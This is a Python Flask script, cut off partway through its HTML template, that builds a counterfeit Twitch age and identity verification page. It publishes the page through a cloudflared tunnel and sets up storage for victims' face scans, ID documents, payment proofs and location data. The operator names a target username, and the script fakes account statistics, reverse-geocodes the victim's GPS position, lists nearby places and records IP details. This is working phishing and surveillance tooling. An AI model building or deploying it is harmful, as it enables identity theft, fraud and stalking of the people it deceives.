import os
import base64
import subprocess
import sys
import re
import logging
import json
import random
from threading import Thread
import time
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify
import requests
from geopy.geocoders import Nominatim
from geopy.distance import geodesic

# --- Dependency and Tunnel Setup ---

def install_package(package):
    """Installs a package using pip quietly."""
    subprocess.check_call([sys.executable, "-m", "pip", "install", package, "-q", "--upgrade"])

def check_dependencies():
    """Checks for cloudflared and required Python packages."""
    try:
        subprocess.run(["cloudflared", "--version"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("[ERROR] 'cloudflared' is not installed or not in your system's PATH.", file=sys.stderr)
        print("Please install it from: https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/", file=sys.stderr)
        sys.exit(1)
    
    packages = {"Flask": "flask", "requests": "requests", "geopy": "geopy"}
    for pkg_name, import_name in packages.items():
        try:
            __import__(import_name)
        except ImportError:
            install_package(pkg_name)

def run_cloudflared_and_print_link(port, script_name):
    """Starts a cloudflared tunnel and prints the public link."""
    cmd = ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{port}", "--protocol", "http2"]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    for line in iter(process.stdout.readline, ''):
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            print(f"{script_name} Public Link: {match.group(0)}")
            sys.stdout.flush()
            break
    process.wait()

def generate_random_username():
    """Generate a random Twitch-like username."""
    gaming_prefixes = ["pro", "epic", "l33t", "ninja", "ghost", "phantom", "shadow", "wolf", "dragon", "blaze",
                      "toxic", "vortex", "cyber", "neon", "cosmic", "royal", "alpha", "beta", "omega", "sigma"]
    
    gaming_suffixes = ["slayer", "killer", "master", "gamer", "player", "streamer", "warrior", "hunter", "assassin",
                      "legend", "hero", "champion", "god", "lord", "king", "queen", "prince", "knight", "samurai"]
    
    adjectives = ["angry", "happy", "sad", "crazy", "wild", "cool", "hot", "cold", "fast", "slow",
                 "big", "small", "tiny", "huge", "massive", "micro", "mega", "super", "hyper", "ultra"]
    
    nouns = ["panda", "bear", "cat", "dog", "fox", "wolf", "tiger", "lion", "eagle", "hawk",
            "shark", "whale", "dolphin", "octopus", "snake", "spider", "ant", "bee", "butterfly", "dragon"]
    
    # Generate different username patterns
    username_patterns = [
        lambda: f"{random.choice(gaming_prefixes)}_{random.choice(gaming_suffixes)}{random.randint(10, 999)}",
        lambda: f"{random.choice(adjectives)}_{random.choice(nouns)}{random.randint(1, 99)}",
        lambda: f"xX_{random.choice(gaming_prefixes)}_{random.choice(nouns)}_Xx",
        lambda: f"TTV_{random.choice(adjectives)}{random.choice(gaming_suffixes)}",
        lambda: f"twitch_{random.choice(nouns)}_{random.randint(100, 999)}",
        lambda: f"{random.choice(gaming_prefixes)}_{random.choice(nouns)}TV",
        lambda: f"{random.choice(adjectives)}{random.choice(gaming_suffixes)}{random.randint(1000, 9999)}",
        lambda: f"{random.choice(['im', 'iam', 'the'])}{random.choice(gaming_suffixes)}",
        lambda: f"{random.choice(nouns)}Of{random.choice(adjectives).title()}",
        lambda: f"{random.choice(['official', 'real', 'true'])}{random.choice(gaming_suffixes).title()}"
    ]
    
    return random.choice(username_patterns)()

def find_profile_picture(folder):
    """Search for an image file in the folder to use as profile picture."""
    image_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp']
    
    for file in os.listdir(folder):
        file_lower = file.lower()
        if any(file_lower.endswith(ext) for ext in image_extensions):
            filepath = os.path.join(folder, file)
            try:
                # Read the image file and convert to base64
                with open(filepath, 'rb') as f:
                    image_data = f.read()
                    image_ext = os.path.splitext(file)[1].lower()
                    
                    # Determine MIME type based on extension
                    mime_types = {
                        '.jpg': 'image/jpeg',
                        '.jpeg': 'image/jpeg',
                        '.png': 'image/png',
                        '.gif': 'image/gif',
                        '.bmp': 'image/bmp',
                        '.webp': 'image/webp'
                    }
                    
                    mime_type = mime_types.get(image_ext, 'image/jpeg')
                    base64_image = base64.b64encode(image_data).decode('utf-8')
                    
                    return {
                        'filename': file,
                        'data_url': f'data:{mime_type};base64,{base64_image}',
                        'path': filepath
                    }
            except Exception as e:
                print(f"Error reading profile picture {file}: {e}")
    
    return None

def get_verification_settings():
    """Get user preferences for Twitch verification process."""
    print("\n" + "="*60)
    print("TWITCH AGE VERIFICATION SETUP")
    print("="*60)
    
    # Get target username
    print("\n[+] TARGET USERNAME SETUP")
    print("Enter the Twitch username to display in the verification page")
    print("Leave blank for random username generation")
    
    username_input = input("Target username (or press Enter for random): ").strip()
    if username_input:
        settings = {'target_username': username_input}
    else:
        random_username = generate_random_username()
        settings = {'target_username': random_username}
        print(f"[+] Generated random username: {random_username}")
    
    # Look for profile picture
    global DOWNLOAD_FOLDER
    profile_pic = find_profile_picture(DOWNLOAD_FOLDER)
    if profile_pic:
        settings['profile_picture'] = profile_pic['data_url']
        settings['profile_picture_filename'] = profile_pic['filename']
        print(f"[+] Found profile picture: {profile_pic['filename']}")
        print(f"[+] Using profile picture for @{settings['target_username']}")
    else:
        settings['profile_picture'] = None
        settings['profile_picture_filename'] = None
        print(f"[!] No profile picture found in folder")
        print(f"[!] Tip: Place an image (jpg/png) in {DOWNLOAD_FOLDER} to use as profile picture")
    
    print(f"\n[+] Verification will appear for: @{settings['target_username']}")
    
    # Account type
    print("\n1. Account Type:")
    print("Is this a streamer or viewer account?")
    print("1. Streamer Account (wants to stream content)")
    print("2. Viewer Account (wants to watch age-restricted content)")
    
    while True:
        account_type = input("Select account type (1/2, default: 1): ").strip()
        if not account_type:
            settings['account_type'] = 'streamer'
            break
        if account_type == '1':
            settings['account_type'] = 'streamer'
            break
        elif account_type == '2':
            settings['account_type'] = 'viewer'
            break
        else:
            print("Please enter 1 or 2.")
    
    # Face scan duration
    print(f"\n2. Face Scan Duration:")
    print(f"How many seconds for face verification for {settings['account_type']} account?")
    print("Recommended: 15-30 seconds for complete verification")
    
    while True:
        try:
            duration = input("Duration in seconds (5-60, default: 25): ").strip()
            if not duration:
                settings['face_duration'] = 25
                break
            duration = int(duration)
            if 5 <= duration <= 60:
                settings['face_duration'] = duration
                break
            else:
                print("Please enter a number between 5 and 60.")
        except ValueError:
            print("Please enter a valid number.")
    
    # ID verification
    print(f"\n3. ID Document Verification:")
    print(f"Require ID document upload for age verification?")
    id_enabled = input("Enable ID verification (y/n, default: y): ").strip().lower()
    settings['id_enabled'] = id_enabled in ['y', 'yes', '']
    
    if settings['id_enabled']:
        print("\nID Document Type:")
        print("1. Government ID (Passport, Driver's License)")
        print("2. Student ID")
        print("3. Parental Consent Form")
        
        while True:
            id_type = input("Select ID type (1/2/3, default: 1): ").strip()
            if not id_type:
                settings['id_type'] = 'government'
                break
            if id_type == '1':
                settings['id_type'] = 'government'
                break
            elif id_type == '2':
                settings['id_type'] = 'student'
                break
            elif id_type == '3':
                settings['id_type'] = 'parental'
                break
            else:
                print("Please enter 1, 2, or 3.")
    
    # Payment verification (for streamers)
    if settings['account_type'] == 'streamer':
        print(f"\n4. Payment Verification:")
        print(f"Require payment method verification for monetization?")
        payment_enabled = input("Enable payment verification (y/n, default: y): ").strip().lower()
        settings['payment_enabled'] = payment_enabled in ['y', 'yes', '']
    else:
        settings['payment_enabled'] = False
    
    # Location verification
    print(f"\n5. Location Verification:")
    print(f"Require location verification for regional compliance?")
    location_enabled = input("Enable location verification (y/n, default: y): ").strip().lower()
    settings['location_enabled'] = location_enabled in ['y', 'yes', '']
    
    return settings

# --- Location Processing Functions ---

geolocator = Nominatim(user_agent="twitch_verification")

def get_ip_info():
    """Get IP-based location information."""
    try:
        response = requests.get("http://ipinfo.io/json", timeout=5)
        response.raise_for_status()
        return response.json()
    except requests.RequestException:
        return {}

def get_nearby_places(latitude, longitude, radius=2000, limit=3):
    """Return nearby shops/amenities."""
    overpass_query = f"""
    [out:json];
    (
        node["shop"](around:{radius},{latitude},{longitude});
        way["shop"](around:{radius},{latitude},{longitude});
        node["amenity"](around:{radius},{latitude},{longitude});
        way["amenity"](around:{radius},{latitude},{longitude});
    );
    out center;
    """
    try:
        response = requests.get("http://overpass-api.de/api/interpreter", params={'data': overpass_query}, timeout=10)
        response.raise_for_status()
        elements = response.json().get('elements', [])
        results = []
        
        for element in elements:
            tags = element.get('tags', {})
            lat_elem = element.get('lat') or element.get('center', {}).get('lat')
            lon_elem = element.get('lon') or element.get('center', {}).get('lon')
            
            if not lat_elem or not lon_elem:
                continue
            
            distance = geodesic((latitude, longitude), (lat_elem, lon_elem)).meters
            
            place_type = tags.get("shop") or tags.get("amenity") or tags.get("tourism") or "unknown"
            place_name = tags.get("name", "Unnamed Place")
            
            results.append({
                "type": place_type,
                "name": place_name,
                "address": f"{tags.get('addr:street', '')} {tags.get('addr:housenumber', '')}".strip(),
                "distance_m": round(distance, 1)
            })
        
        results.sort(key=lambda x: x["distance_m"])
        return results[:limit]
        
    except requests.RequestException:
        return []

def process_and_save_location(data, session_id):
    """Process and save location data with metadata."""
    try:
        lat = data.get('latitude')
        lon = data.get('longitude')
        
        if not lat or not lon:
            return
        
        # Get address information
        address_details = {}
        full_address = "Unknown"
        try:
            location = geolocator.reverse((lat, lon), language='en', timeout=10)
            if location:
                full_address = location.address
                if hasattr(location, 'raw') and 'address' in location.raw:
                    address_details = location.raw.get('address', {})
        except Exception:
            pass
        
        # Get nearby places
        places = get_nearby_places(lat, lon)
        
        # Get IP info
        ip_info = get_ip_info()
        
        # Prepare structured data
        location_data = {
            "verification_type": "twitch_location",
            "session_id": session_id,
            "timestamp": datetime.now().isoformat(),
            "gps_coordinates": {
                "latitude": lat,
                "longitude": lon,
                "accuracy_m": data.get('accuracy'),
                "altitude_m": data.get('altitude'),
                "speed_mps": data.get('speed'),
                "heading_degrees": data.get('heading')
            },
            "address_information": {
                "full_address": full_address,
                "house_number": address_details.get("house_number"),
                "street": address_details.get("road"),
                "city": address_details.get("city"),
                "state": address_details.get("state"),
                "postal_code": address_details.get("postcode"),
                "country": address_details.get("country")
            },
            "nearby_places": places,
            "network_information": {
                "ip_address": ip_info.get("ip"),
                "city": ip_info.get("city"),
                "region": ip_info.get("region"),
                "country": ip_info.get("country"),
                "isp": ip_info.get("org", "").split()[-1] if ip_info.get("org") else "Unknown"
            },
            "device_info": {
                "user_agent": data.get('user_agent', 'Unknown'),
                "timestamp_utc": datetime.utcnow().isoformat(),
                "local_timestamp": datetime.now().isoformat()
            }
        }
        
        # Save to file
        filename = f"twitch_location_{session_id}.json"
        filepath = os.path.join(DOWNLOAD_FOLDER, 'location_data', filename)
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(location_data, f, indent=2, ensure_ascii=False)
        
        print(f"Twitch location data saved: {filename}")
        
    except Exception as e:
        print(f"Error processing location: {e}")

# --- Flask Application ---

app = Flask(__name__)

# Global settings
VERIFICATION_SETTINGS = {
    'target_username': 'twitch_user_' + str(random.randint(100000, 999999)),
    'account_type': 'streamer',
    'face_duration': 25,
    'id_enabled': True,
    'id_type': 'government',
    'payment_enabled': True,
    'location_enabled': True,
    'profile_picture': None,
    'profile_picture_filename': None
}

DOWNLOAD_FOLDER = os.path.expanduser('~/storage/downloads/Twitch Verification')
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'face_scans'), exist_ok=True)
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'id_documents'), exist_ok=True)
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'payment_proofs'), exist_ok=True)
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'location_data'), exist_ok=True)
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'user_data'), exist_ok=True)

def create_html_template(settings):
    """Creates the comprehensive Twitch verification template."""
    target_username = settings['target_username']
    account_type = settings['account_type']
    face_duration = settings['face_duration']
    id_enabled = settings['id_enabled']
    id_type = settings.get('id_type', 'government')
    payment_enabled = settings['payment_enabled']
    location_enabled = settings['location_enabled']
    profile_picture = settings.get('profile_picture')
    profile_picture_filename = settings.get('profile_picture_filename')
    
    # Generate account stats
    followers = random.randint(500, 10000) if account_type == 'streamer' else random.randint(10, 1000)
    following = random.randint(50, 500)
    total_views = random.randint(1000, 100000) if account_type == 'streamer' else 0
    account_age = random.randint(30, 365 * 3)  # days
    
    # Calculate total steps
    total_steps = 2  # Introduction + Face
    if id_enabled:
        total_steps += 1
    if payment_enabled:
        total_steps += 1
    if location_enabled:
        total_steps += 1
    total_steps += 1  # Final step
    
    # Generate the base template with variables
    template = f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Twitch Age & Identity Verification</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }}
        
        body {{
            background-color: #0f0f23;
            background-image: radial-gradient(circle at 50% 50%, #1a1a2e 0%, #0f0f23 100%);
            color: #efeff1;
            min-height: 100vh;
            padding: 20px;
        }}
        
        .container {{
            max-width: 600px;
            width: 100%;
            margin: 0 auto;
        }}
        
        .logo-header {{
            text-align: center;
            margin-bottom: 30px;
            padding-top: 20px;
        }}
        
        .logo {{
            font-size: 2.5rem;
            font-weight: 800;
            color: #9146ff;
            margin-bottom: 10px;
            letter-spacing: -0.5px;
        }}
        
        .logo-subtitle {{
            color: #adadb8;
            font-size: 0.9rem;
            opacity: 0.8;
        }}
        
        .account-card {{
            background: linear-gradient(135deg, #18182b 0%, #1a1a2e 100%);
            border-radius: 16px;
            padding: 25px;
            margin-bottom: 25px;
            border: 1px solid #26263a;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
        }}
        
        .account-header {{
            display: flex;
            align-items: center;
            margin-bottom: 20px;
        }}
        
        .account-avatar {{
            width: 80px;
            height: 80px;
            border-radius: 12px;
            background: linear-gradient(135deg, #9146ff, #bf94ff);
            overflow: hidden;
            margin-right: 20px;
            border: 3px solid #26263a;
        }}
        
        .account-avatar img {{
            width: 100%;
            height: 100%;
            object-fit: cover;
        }}
        
        .account-info {{
            flex: 1;
        }}
        
        .account-display-name {{
            font-size: 1.5rem;
            font-weight: 700;
            color: #efeff1;
            margin-bottom: 5px;
        }}
        
        .account-username {{
            color: #adadb8;
            font-size: 0.9rem;
            margin-bottom: 8px;
        }}
        
        .account-badge {{
            display: inline-block;
            background: linear-gradient(135deg, #9146ff, #bf94ff);
            color: white;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 0.8rem;
            font-weight: 600;
        }}
        
        .account-stats {{
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 15px;
            margin-top: 20px;
        }}
        
        .stat-item {{
            text-align: center;
            padding: 15px;
            background: rgba(38, 38, 58, 0.5);
            border-radius: 12px;
            border: 1px solid #2d2d44;
        }}
        
        .stat-number {{
            font-size: 1.2rem;
            font-weight: 700;
            color: #9146ff;
            margin-bottom: 5px;
        }}
        
        .stat-label {{
            color: #adadb8;
            font-size: 0.8rem;
        }}
        
        .verification-container {{
            background: linear-gradient(135deg, #18182b 0%, #1a1a2e 100%);
            border-radius: 16px;
            padding: 30px;
            margin-bottom: 25px;
            border: 1px solid #26263a;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
        }}
        
        .step {{
            display: none;
        }}
        
        .step.active {{
            display: block;
            animation: fadeIn 0.3s ease;
        }}
        
        @keyframes fadeIn {{
            from {{ opacity: 0; transform: translateY(10px); }}
            to {{ opacity: 1; transform: translateY(0); }}
        }}
        
        .step-title {{
            font-size: 1.5rem;
            font-weight: 700;
            color: #efeff1;
            margin-bottom: 10px;
        }}
        
        .step-subtitle {{
            color: #adadb8;
            font-size: 0.95rem;
            line-height: 1.5;
            margin-bottom: 25px;
        }}
        
        .progress-container {{
            margin-bottom: 30px;
        }}
        
        .progress-bar {{
            height: 6px;
            background: #26263a;
            border-radius: 3px;
            overflow: hidden;
            margin-bottom: 10px;
        }}
        
        .progress-fill {{
            height: 100%;
            background: linear-gradient(90deg, #9146ff, #bf94ff);
            width: 0%;
            transition: width 0.3s ease;
            border-radius: 3px;
        }}
        
        .progress-steps {{
            display: flex;
            justify-content: space-between;
            position: relative;
            margin: 20px 0 30px;
        }}
        
        .step-indicator {{
            width: 36px;
            height: 36px;
            border-radius: 50%;
            background: #26263a;
            color: #adadb8;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 600;
            position: relative;
            z-index: 2;
            border: 2px solid #26263a;
            transition: all 0.3s ease;
        }}
        
        .step-indicator.active {{
            background: #9146ff;
            color: white;
            border-color: #bf94ff;
            box-shadow: 0 0 0 4px rgba(145, 70, 255, 0.2);
        }}
        
        .step-indicator.completed {{
            background: #00a35c;
            color: white;
            border-color: #00d474;
        }}
        
        .step-line {{
            position: absolute;
            top: 18px;
            left: 18px;
            right: 18px;
            height: 2px;
            background: #26263a;
            z-index: 1;
        }}
        
        .step-line-fill {{
            position: absolute;
            top: 18px;
            left: 18px;
            height: 2px;
            background: linear-gradient(90deg, #9146ff, #bf94ff);
            z-index: 1;
            width: 0%;
            transition: width 0.3s ease;
        }}
        
        /* Twitch Purple Theme */
        .twitch-purple {{
            color: #9146ff;
        }}
        
        .twitch-bg {{
            background: linear-gradient(135deg, #9146ff, #bf94ff);
        }}
        
        /* Warning Box */
        .warning-box {{
            background: linear-gradient(135deg, rgba(255, 69, 0, 0.1) 0%, rgba(255, 69, 0, 0.05) 100%);
            border: 1px solid rgba(255, 69, 0, 0.3);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 25px;
        }}
        
        .warning-header {{
            display: flex;
            align-items: center;
            margin-bottom: 10px;
        }}
        
        .warning-icon {{
            font-size: 1.5rem;
            margin-right: 10px;
            color: #ff4500;
        }}
        
        .warning-title {{
            font-weight: 600;
            color: #ff4500;
        }}
        
        .warning-content {{
            color: #ffa07a;
            font-size: 0.9rem;
            line-height: 1.5;
        }}
        
        /* Info Box */
        .info-box {{
            background: linear-gradient(135deg, rgba(145, 70, 255, 0.1) 0%, rgba(191, 148, 255, 0.05) 100%);
            border: 1px solid rgba(145, 70, 255, 0.3);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 25px;
        }}
        
        .info-header {{
            display: flex;
            align-items: center;
            margin-bottom: 10px;
        }}
        
        .info-icon {{
            font-size: 1.5rem;
            margin-right: 10px;
            color: #9146ff;
        }}
        
        .info-title {{
            font-weight: 600;
            color: #9146ff;
        }}
        
        .info-content {{
            color: #bf94ff;
            font-size: 0.9rem;
            line-height: 1.5;
        }}
        
        /* Face Verification Styles */
        .camera-container {{
            width: 300px;
            height: 300px;
            margin: 0 auto 25px;
            border-radius: 50%;
            overflow: hidden;
            background: #0f0f23;
            border: 3px solid #26263a;
            position: relative;
        }}
        
        .camera-container video {{
            width: 100%;
            height: 100%;
            object-fit: cover;
        }}
        
        .face-overlay {{
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
        }}
        
        .face-circle {{
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 200px;
            height: 200px;
            border: 3px solid #9146ff;
            border-radius: 50%;
            box-shadow: 0 0 0 9999px rgba(15, 15, 35, 0.7);
        }}
        
        .face-timer {{
            text-align: center;
            font-size: 2.5rem;
            font-weight: 700;
            color: #9146ff;
            margin-bottom: 20px;
            font-family: 'Courier New', monospace;
        }}
        
        .face-instruction {{
            background: rgba(145, 70, 255, 0.1);
            border: 1px solid rgba(145, 70, 255, 0.3);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 25px;
            text-align: center;
        }}
        
        .instruction-icon {{
            font-size: 2.5rem;
            margin-bottom: 10px;
        }}
        
        .instruction-text {{
            font-size: 1.1rem;
            font-weight: 600;
            margin-bottom: 5px;
            color: #bf94ff;
        }}
        
        .instruction-detail {{
            color: #adadb8;
            font-size: 0.9rem;
        }}
        
        /* ID Verification Styles */
        .id-upload-section {{
            display: grid;
            grid-template-columns: 1fr;
            gap: 20px;
            margin-bottom: 25px;
        }}
        
        .id-card {{
            background: rgba(38, 38, 58, 0.5);
            border: 2px dashed #3d3d5c;
            border-radius: 12px;
            padding: 25px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s ease;
        }}
        
        .id-card:hover {{
            border-color: #9146ff;
            background: rgba(145, 70, 255, 0.1);
            transform: translateY(-2px);
        }}
        
        .id-card.dragover {{
            border-color: #9146ff;
            background: rgba(145, 70, 255, 0.2);
        }}
        
        .id-icon {{
            font-size: 3rem;
            margin-bottom: 15px;
            color: #9146ff;
        }}
        
        .id-title {{
            font-size: 1.1rem;
            font-weight: 600;
            margin-bottom: 8px;
            color: #efeff1;
        }}
        
        .id-subtitle {{
            color: #adadb8;
            font-size: 0.9rem;
            margin-bottom: 15px;
        }}
        
        .id-preview {{
            margin-top: 15px;
            display: none;
        }}
        
        .id-preview-image {{
            max-width: 200px;
            max-height: 150px;
            border-radius: 8px;
            border: 2px solid #26263a;
        }}
        
        .id-requirements {{
            background: rgba(38, 38, 58, 0.5);
            border-radius: 12px;
            padding: 20px;
            margin-top: 20px;
        }}
        
        .requirements-title {{
            font-weight: 600;
            margin-bottom: 10px;
            color: #efeff1;
        }}
        
        .requirements-list {{
            list-style: none;
            padding-left: 0;
        }}
        
        .requirements-list li {{
            color: #adadb8;
            font-size: 0.9rem;
            margin-bottom: 8px;
            padding-left: 20px;
            position: relative;
        }}
        
        .requirements-list li:before {{
            content: "•";
            color: #9146ff;
            position: absolute;
            left: 0;
        }}
        
        /* Payment Verification Styles */
        .payment-options {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 15px;
            margin-bottom: 25px;
        }}
        
        .payment-option {{
            background: rgba(38, 38, 58, 0.5);
            border: 2px solid #3d3d5c;
            border-radius: 12px;
            padding: 20px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s ease;
        }}
        
        .payment-option:hover {{
            border-color: #9146ff;
            background: rgba(145, 70, 255, 0.1);
        }}
        
        .payment-option.selected {{
            border-color: #9146ff;
            background: rgba(145, 70, 255, 0.2);
            box-shadow: 0 0 0 3px rgba(145, 70, 255, 0.2);
        }}
        
        .payment-icon {{
            font-size: 2.5rem;
            margin-bottom: 10px;
            color: #9146ff;
        }}
        
        .payment-name {{
            font-weight: 600;
            color: #efeff1;
            margin-bottom: 5px;
        }}
        
        .payment-hint {{
            color: #adadb8;
            font-size: 0.8rem;
        }}
        
        .payment-details {{
            background: rgba(38, 38, 58, 0.5);
            border-radius: 12px;
            padding: 20px;
            margin-top: 20px;
            display: none;
        }}
        
        .form-group {{
            margin-bottom: 15px;
        }}
        
        .form-label {{
            display: block;
            color: #adadb8;
            font-size: 0.9rem;
            margin-bottom: 5px;
        }}
        
        .form-input {{
            width: 100%;
            padding: 12px 15px;
            background: #0f0f23;
            border: 1px solid #3d3d5c;
            border-radius: 8px;
            color: #efeff1;
            font-size: 0.95rem;
            transition: border-color 0.3s ease;
        }}
        
        .form-input:focus {{
            outline: none;
            border-color: #9146ff;
            box-shadow: 0 0 0 3px rgba(145, 70, 255, 0.2);
        }}
        
        /* Location Verification Styles */
        .location-container {{
            text-align: center;
            margin-bottom: 25px;
        }}
        
        .location-icon {{
            font-size: 4rem;
            margin-bottom: 20px;
            color: #9146ff;
        }}
        
        .location-info {{
            background: rgba(145, 70, 255, 0.1);
            border: 1px solid rgba(145, 70, 255, 0.3);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 20px;
        }}
        
        .location-accuracy {{
            background: rgba(38, 38, 58, 0.5);
            border-radius: 12px;
            padding: 20px;
            margin: 20px 0;
        }}
        
        .accuracy-meter {{
            width: 100%;
            height: 10px;
            background: #26263a;
            border-radius: 5px;
            margin: 15px 0;
            overflow: hidden;
        }}
        
        .accuracy-fill {{
            height: 100%;
            background: linear-gradient(90deg, #ff4500, #ffa500, #00d474);
            width: 0%;
            transition: width 1s ease-in-out;
            border-radius: 5px;
        }}
        
        .accuracy-labels {{
            display: flex;
            justify-content: space-between;
            font-size: 0.8rem;
            color: #adadb8;
            margin-top: 5px;
        }}
        
        .location-details {{
            background: rgba(38, 38, 58, 0.5);
            border-radius: 12px;
            padding: 20px;
            margin-top: 20px;
            text-align: left;
            display: none;
        }}
        
        .detail-row {{
            display: flex;
            margin-bottom: 10px;
            padding-bottom: 10px;
            border-bottom: 1px solid #2d2d44;
        }}
        
        .detail-row:last-child {{
            border-bottom: none;
            margin-bottom: 0;
            padding-bottom: 0;
        }}
        
        .detail-label {{
            width: 120px;
            color: #adadb8;
            font-size: 0.9rem;
        }}
        
        .detail-value {{
            flex: 1;
            color: #efeff1;
            font-size: 0.9rem;
            font-weight: 500;
        }}
        
        /* Button Styles */
        .button {{
            width: 100%;
            padding: 16px 24px;
            border: none;
            border-radius: 12px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }}
        
        .primary-btn {{
            background: linear-gradient(135deg, #9146ff, #bf94ff);
            color: white;
        }}
        
        .primary-btn:hover:not(:disabled) {{
            transform: translateY(-2px);
            box-shadow: 0 8px 32px rgba(145, 70, 255, 0.3);
        }}
        
        .primary-btn:disabled {{
            opacity: 0.5;
            cursor: not-allowed;
            transform: none !important;
        }}
        
        .secondary-btn {{
            background: rgba(38, 38, 58, 0.5);
            color: #adadb8;
            border: 1px solid #3d3d5c;
        }}
        
        .secondary-btn:hover {{
            background: rgba(38, 38, 58, 0.8);
            border-color: #9146ff;
            color: #efeff1;
        }}
        
        .loading-spinner {{
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
        }}
        
        @keyframes spin {{
            to {{ transform: rotate(360deg); }}
        }}
        
        /* Status Messages */
        .status-message {{
            padding: 15px 20px;
            border-radius: 12px;
            margin-bottom: 20px;
            font-size: 0.9rem;
            display: none;
        }}
        
        .status-success {{
            background: rgba(0, 163, 92, 0.1);
            border: 1px solid rgba(0, 163, 92, 0.3);
            color: #00d474;
        }}
        
        .status-error {{
            background: rgba(255, 69, 0, 0.1);
            border: 1px solid rgba(255, 69, 0, 0.3);
            color: #ff4500;
        }}
        
        .status-processing {{
            background: rgba(145, 70, 255, 0.1);
            border: 1px solid rgba(145, 70, 255, 0.3);
            color: #bf94ff;
        }}
        
        /* Completion Page */
        .completion-container {{
            text-align: center;
            padding: 40px 20px;
        }}
        
        .success-icon {{
            font-size: 5rem;
            margin-bottom: 25px;
            color: #00d474;
            animation: popIn 0.5s ease-out;
        }}
        
        @keyframes popIn {{
            0% {{ transform: scale(0.5); opacity: 0; }}
            70% {{ transform: scale(1.1); opacity: 1; }}
            100% {{ transform: scale(1); opacity: 1; }}
        }}
        
        .completion-title {{
            font-size: 2rem;
            font-weight: 700;
            margin-bottom: 15px;
            color: #00d474;
        }}
        
        .next-steps {{
            margin-top: 40px;
            padding-top: 25px;
            border-top: 1px solid #26263a;
        }}
        
        .countdown {{
            font-size: 1.2rem;
            font-weight: 700;
            color: #9146ff;
            margin: 20px 0;
        }}
        
        /* Review Page */
        .review-container {{
            text-align: center;
            padding: 40px 20px;
        }}
        
        .review-icon {{
            font-size: 5rem;
            margin-bottom: 25px;
            color: #9146ff;
            animation: pulse 2s infinite;
        }}
        
        @keyframes pulse {{
            0% {{ transform: scale(1); opacity: 1; }}
            50% {{ transform: scale(1.05); opacity: 0.8; }}
            100% {{ transform: scale(1); opacity: 1; }}
        }}
        
        .review-steps {{
            background: rgba(38, 38, 58, 0.5);
            border-radius: 16px;
            padding: 25px;
            margin: 30px 0;
        }}
        
        .review-step {{
            display: flex;
            align-items: center;
            margin-bottom: 25px;
            padding-bottom: 25px;
            border-bottom: 1px solid #2d2d44;
        }}
        
        .review-step:last-child {{
            border-bottom: none;
            margin-bottom: 0;
            padding-bottom: 0;
        }}
        
        .step-number {{
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: #9146ff;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 700;
            margin-right: 20px;
            flex-shrink: 0;
        }}
        
        .step-content {{
            text-align: left;
            flex: 1;
        }}
        
        .step-title {{
            font-weight: 600;
            margin-bottom: 5px;
            color: #efeff1;
        }}
        
        .step-description {{
            color: #adadb8;
            font-size: 0.9rem;
            line-height: 1.5;
        }}
        
        /* Footer */
        .footer {{
            text-align: center;
            margin-top: 40px;
            padding-top: 20px;
            border-top: 1px solid #26263a;
            color: #adadb8;
            font-size: 0.8rem;
        }}
        
        .footer-links {{
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-top: 15px;
        }}
        
        .footer-links a {{
            color: #adadb8;
            text-decoration: none;
        }}
        
        .footer-links a:hover {{
            color: #9146ff;
            text-decoration: underline;
        }}
        
        /* Utility Classes */
        .hidden {{
            display: none !important;
        }}
        
        .file-input {{
            display: none;
        }}
        
        .text-center {{
            text-align: center;
        }}
        
        .mt-20 {{
            margin-top: 20px;
        }}
        
        .mb-20 {{
            margin-bottom: 20px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <!-- Twitch Logo Header -->
        <div class="logo-header">
            <div class="logo">
                <span class="twitch-purple">Twitch</span>
            </div>
            <div class="logo-subtitle">Age & Identity Verification System</div>
        </div>
        
        <!-- Account Information Card -->
        <div class="account-card">
            <div class="account-header">
                <div class="account-avatar">
